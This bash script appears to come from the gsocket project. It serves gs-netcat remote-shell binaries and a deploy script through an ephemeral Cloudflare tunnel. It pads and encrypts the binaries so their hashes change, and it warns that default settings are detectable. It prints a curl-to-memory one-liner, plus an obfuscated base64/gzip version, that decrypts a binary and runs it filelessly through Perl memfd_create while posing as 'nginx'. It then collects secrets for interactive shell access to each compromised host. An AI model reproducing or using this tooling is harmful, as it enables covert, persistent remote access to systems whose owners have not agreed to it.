#! /usr/bin/env bash

# Most users never need to use this script. If you just want to deploy gsocket
# then go to https://gsocket.io/deploy or use
#    bash -c "$(curl -fsSL https://gsocket.io/y)"

# This script spins up a Cloudflare Tunnel to serve the deploy.sh script
# and all binary files from an ephemeral URL.
#
# This is helpful if the user wants to:
# 1. Received a Telegram, Discord or Webhook notification on installs
# 2. Use your own Global Socket Relay Network
#
# To run this script type:
#   export GS_PORT=
#   export GS_HOST=
#   export GS_BEACON=10
#   export GS_NAME=foo
#   export GS_URL_BASE=
#   bash -c "$(curl -fsSL https://gsocket.io/deploy/ys)"
# ---or---
#   LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/deploy/ys)"

[[ -z $PORT ]] && PORT="32803"

###----BEGIN changed by CICD script-----
CICD_GS_BRANCH=
###-----END-----
[[ $CICD_GS_BRANCH == "master" ]] && unset CICD_GS_BRANCH
[[ -z $GS_BRANCH ]] && GS_BRANCH="${CICD_GS_BRANCH}"
BINDIR="${GS_BRANCH:+$GS_BRANCH/}bin"

DEPLOY_SH_NAME="y"

DATA_DIR="gs-www-data"
DATA_DIR_BRANCH="${DATA_DIR}${GS_BRANCH:+/$GS_BRANCH}"
URL_BRANCH="${GS_BRANCH:+/$GS_BRANCH}"
packages=()
packages+=("linux-x86_64")
packages+=("linux-aarch64")
packages+=("linux-mips64")
packages+=("linux-mips32")
packages+=("linux-mipsel")
packages+=("linux-i686")
packages+=("linux-arm")
packages+=("linux-armv6")
packages+=("linux-armv7l")
packages+=("linux-powerpc")
packages+=("linux-powerpc64")
packages+=("linux-powerpcle")
packages+=("linux-powerpc64le")
# packages+=("i686-cygwin.tar.gz")
packages+=("macOS-x86_64")
packages+=("freebsd-x86_64")
packages+=("openbsd-x86_64")

[[ -t 1 ]] && {
	CY="\033[1;33m" # yellow
	CDY="\033[0;33m" # yellow
	CB="\033[1;34m" # blue
	CG="\033[1;32m" # green
	CDG="\033[0;32m" # green
	CR="\033[1;31m" # red
	CDR="\033[0;31m" # red
	CC="\033[1;36m" # cyan
	CDC="\033[0;36m" # cyan
	CM="\033[1;35m" # magenta
	CDM="\033[0;35m" # magenta
	CN="\033[0m"    # none
	CW="\033[1;37m"
    CF="\e[2m"    # faint
}

do_stop() {
    local arr

    [[ -f "cloudflare.pid" ]] && {
        kill -9 "$(cat cloudflare.pid)" &>/dev/null
        arr+=("cloudflare.pid")
    }
    [[ -f "www.pid" ]] && {
        kill -9 "$(cat www.pid)" &>/dev/null
        arr+=("www.pid")
    }
    [ -f "www.log" ] && arr+=("www.log")

    rm -f "${arr[@]}"
}

do_cleanup() {
    rm -f "cloudflare.log" "www_err.log" &>/dev/null
}

ERREXIT() {
    local code
    code=$1
    shift 1
    [[ -n "$*" ]] && echo -e >&2 "$*"
    exit "$code"
}


WARN() {
	echo -e "--> ${CY}WARNING: ${CN}$*"
}

do_sigtrap()
{
    do_stop
    do_cleanup
    echo -e "\nType ${CDC}rm -rf .encpass ${DATA_DIR_BRANCH}${LOG:+ $LOG}; rmdir ${DATA_DIR}${CN} to clean all files."
    exit 0
}

trap do_sigtrap SIGINT SIGPIPE SIGTERM SIGHUP

check_prog()
{
    command -v "$1" >/dev/null && return
    ERREXIT 255 "Not found: $1. Please install ${CDC}${1}${CN}."
}

start()
{
    local pidfn
    local name
    local err_logfn
    name="$1"
    err_logfn="$2"
    pidfn="${name,,}.pid"
    shift 2

    [[ -e "${pidfn}" ]] && { kill -0 "$(cat "${pidfn}")" &>/dev/null || rm -f "${pidfn:?}"; }
    if [[ -e "${pidfn}" ]]; then
        echo -e >&2 "${CY}WARN${CN}: ${name} already running. To restart, type ${CDC}kill -9 $(cat ${pidfn}); rm -f ${pidfn}${CN}"
        return
    fi
    :>"${name,,}.log"
    "$@" >/dev/null 2>"${err_logfn}" &
    echo "$!" >"${pidfn}"
}

check_prog "cloudflared"
check_prog "curl"
PYTHON="python"
command -v python >/dev/null || {
    [[ "$(python3 --version 2>/dev/null)" != "Python 3"* ]] && ERREXIT 255 "Not found: python."
    PYTHON=python3
}
"$PYTHON" -m http.server -h >/dev/null || ERREXIT 255 "Python -m http.server not found."

unset str
[ -z "$GS_HOST" ] && str+=$'\n'"export GS_HOST=<IPv4>"
[ -z "$GS_NAME" ] && str+=$'\n'"export GS_NAME=<process name>"
[ -z "$GS_BIN" ] && str+=$'\n'"export GS_BIN=<filename>"
[ -n "$str" ] && WARN "Using defaults is easily detectable. Try set:${CDC}${str}${CN}"
unset str

[[ ! -d "${DATA_DIR_BRANCH}/bin" ]] && mkdir -p "${DATA_DIR_BRANCH}/bin"
[[ ! -f "${DATA_DIR_BRANCH}/y" ]] && {
    echo -e "Downloading ${CDY}${DEPLOY_SH_NAME}${CN} (e.g. deploy.sh)"
    curl -fsSL "https://gsocket.io${URL_BRANCH}/y" --output "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
}

ENCPASS="$(cat .encpass 2>/dev/null)" || {
    ENCPASS="$(head -c 32 < /dev/urandom | base64 | tr -dc '[:alnum:]' | head -c 16)"
    [ -n "$ENCPASS" ] && {
        IS_NEW_ENCPASS=1
        echo "${ENCPASS}" >.encpass
    }
}

# Create a temp session password
[ -n "$ENCPASS" ] && [ -z "$GS_SECRET" ] && GS_SECRET="$(head -c 32 < /dev/urandom | base64 | tr -dc '[:alnum:]' | head -c 22)"
for n in "${packages[@]}"; do
    [[ ! -f "${DATA_DIR_BRANCH}/bin/gs-netcat_mini-${n}" ]] && {
        echo -e "Downloading ${CDY}gs-netcat_mini-${n}${CN}..."
        curl -fsSL "https://gsocket.io/${BINDIR}/gs-netcat_mini-${n}" --output "${DATA_DIR_BRANCH}/bin/gs-netcat_mini-${n}"
    }
    [ -z "$ENCPASS" ] && continue

    fn="${DATA_DIR_BRANCH}/bin/gs-netcat_mini-${n}"
    [ -f "${fn}.enc" ] && [ -n "$IS_NEW_ENCPASS" ] && rm -f "${fn}.enc"
    [ -f "${fn}.enc" ] && continue
    # Increase size by 32*1024 .. 129*1024-1 bytes
    (cat "$fn" && dd bs=1 count=$((32000 + 1024 * (RANDOM % 128) + RANDOM % 1024 )) if=/dev/urandom 2>/dev/null) | openssl enc -aes-256-cbc -pbkdf2 -k "$ENCPASS" >"${fn}.enc"
done

[ -n "$GS_URL_BASE" ] && URL_BASE="$GS_URL_BASE"

[ -z "$URL_BASE" ] && {
    start "Cloudflare" "cloudflare.log" cloudflared tunnel --url "http://127.0.0.1:${PORT}" --no-autoupdate
    start "www" "www_err.log" "$PYTHON" -m http.server --bind 127.0.0.1 --directory "${DATA_DIR}" "${PORT}"
    i=0
    while :; do
        str=$(grep -E "https://.*trycloudflare.com" cloudflare.log  | tail -n1 | cut -f2 -d'|' | sed 's/ //g')
        [[ -n $str ]] && break
        ((i++))
        [[ $i -gt 10 ]] && {
            do_stop
            ERREXIT 255 "Could not get cloudflare tunnel. See cloudflare.log for details."
        }
        sleep 1
    done

    str="${str:8}"  # cut of https://
    str="${str//[^[:alnum:]].-}"  # sanitize
    [[ -z $str ]] && {
        do_stop
        ERREXIT 255 "Could not get CF URL. See cloudflare.log for details"
    }
    URL_BASE="https://${str}"
}
# URL_BASE='https://gsocket.io'
[ -z "$URL_BASE" ] && ERREXIT 255 "Cant create cloudflare tunnel. Please set ${CDC}URL_BASE='<This Host>'"

# update deploy.sh
sed "s|^URL_BASE=.*|URL_BASE=\"${URL_BASE}\"|" -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
sed "s|^IS_DEPLOY_SERVER=.*|IS_DEPLOY_SERVER=1|" -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
sed "s|^gs_deploy_webhook=.*|gs_deploy_webhook='${URL_BASE}/results.php?s=\${GS_SECRET}'|" -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
sed 's|^GS_WEBHOOK_404_OK=.*|GS_WEBHOOK_404_OK=1|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
[ -n "$GS_HOST" ]   &&  sed 's|^DS_GS_HOST=.*|DS_GS_HOST='"'$GS_HOST'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
[ -n "$GS_PORT" ]   &&  sed 's|^DS_GS_PORT=.*|DS_GS_PORT='"'$GS_PORT'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
[ -n "$GS_BEACON" ] &&  sed 's|^DS_GS_BEACON=.*|DS_GS_BEACON='"'$GS_BEACON'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
[ -n "$GS_NAME" ]   &&  sed 's|^DS_GS_NAME=.*|DS_GS_NAME='"'$GS_NAME'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
[ -n "$GS_BIN" ]    &&  sed 's|^DS_GS_BIN=.*|DS_GS_BIN='"'$GS_BIN'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"

# memexec string:
MEMCMD="X=\"\$(head -c64</dev/urandom|base64|tr -dc [:alnum:]|head -c22)\" && curl -SskfL \"${URL_BASE:-https://BAD}${URL_BRANCH}/bin/gs-netcat_mini-linux-\$(uname -m).enc?s=\$X\"|openssl enc -d -aes-256-cbc -pbkdf2 -k ${ENCPASS}|GS_NOFFPID=1 GS_ARGS=\"-ilD -s\${X}\"${GS_BEACON:+ GS_BEACON=$GS_BEACON}${GS_HOST:+ GS_HOST=$GS_HOST}${GS_PORT:+ GS_PORT=$GS_PORT} perl '"'-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"'"${GS_NAME:-nginx}"'",@ARGV'"'"
MEMCMD64="$(gzip<<<"${MEMCMD}" | base64 -w0)"

echo -e "${CDG}SUCCESS${CN}"
[ -n "$GS_HOST" ]   && echo -e   "--> ${CDG}GS_HOST='$GS_HOST'${CN}"
[ -n "$GS_PORT" ]   && echo -e   "--> ${CDG}GS_PORT='$GS_PORT'${CN}"
[ -n "$GS_BEACON" ] && echo -e   "--> ${CDG}GS_BEACON='$GS_BEACON'${CN}"
[ -n "$GS_NAME" ]   && echo -e   "--> ${CDG}GS_NAME='$GS_NAME'${CN}"
[ -n "$GS_BIN" ]    && echo -e   "--> ${CDG}GS_BIN='$GS_BIN'${CN}"
echo -e "${CDY}To log via Telegram, Discord or webhook.site please edit
${CW}$(realpath "$(pwd)/${DATA_DIR_BRANCH}/y")${CDY} and set${CN}
1. ${CDC}GS_TG_TOKEN=${CN}, ${CDC}GS_TG_CHATID=${CN} OR ${CDC}GS_DISCORD_KEY=${CN} OR ${CDC}GS_WEBHOOK_KEY=${CN}
To deploy gsocket:
    1. ${CM}bash -c \"\$(curl -fsSL ${URL_BASE}${URL_BRANCH}/y)\"${CN}
    2. ${CM}bash -c \"\$(wget --no-verbose -O- ${URL_BASE}${URL_BRANCH}/y)\"${CN}"
echo -e "\
Start gsocket in memory only, without installing - use one of these commands: ${CF}(Linux only)${CN}
    1. ${CDM}${MEMCMD};echo \$X${CN}
    2. ${CDM}echo '${MEMCMD64}'|base64 -d|gunzip|sh${CN}"

# a dirty hack to retrieve results: The deploy scripts requests an
# non-existing PATH/$SECRET and we retrieve it from the error log.

if [ -e www_err.log ]; then
    echo -e "Press CTRL-C to stop"
    echo -e "${CDG}-----SUCCESSFUL DEPLOYMENTS ARE SHOWN BELOW-----${CN}"
    tail -f www_err.log 2>/dev/null | while read -r str; do
        str="${str//[^[:alnum:] \/:.&=?]/}"  # sanitize
        str="${str##*\?s=}"
        str="${str%% *}"
        str="${str//[^[:alnum:]]/}"  # sanitize
        [[ ${#str} -ne 22 ]] && continue
        d="$(date -u)"
        echo -e "[${CDG}${d}${CN}]${CDC}${GS_HOST:+ GS_HOST=$GS_HOST}${GS_PORT:+ GS_PORT=$GS_PORT} gs-netcat -i${GS_BEACON:+w} -s '${CC}${str}${CDC}'${CN}"
        [[ -n $LOG ]] && echo -e "[${d}] gs-netcat -i -s '${str}'" >>"${LOG}"
    done
else 
    echo -e "${CDR}Not found: www_err.log${CN}
--> ${CDY}Installs wont get logged. Check if GS_URL_BASE= is set and logs to www_err.log.${CN}"
    echo -e "Press CTRL-C to stop"
    sleep infinity
fi

do_sigtrap
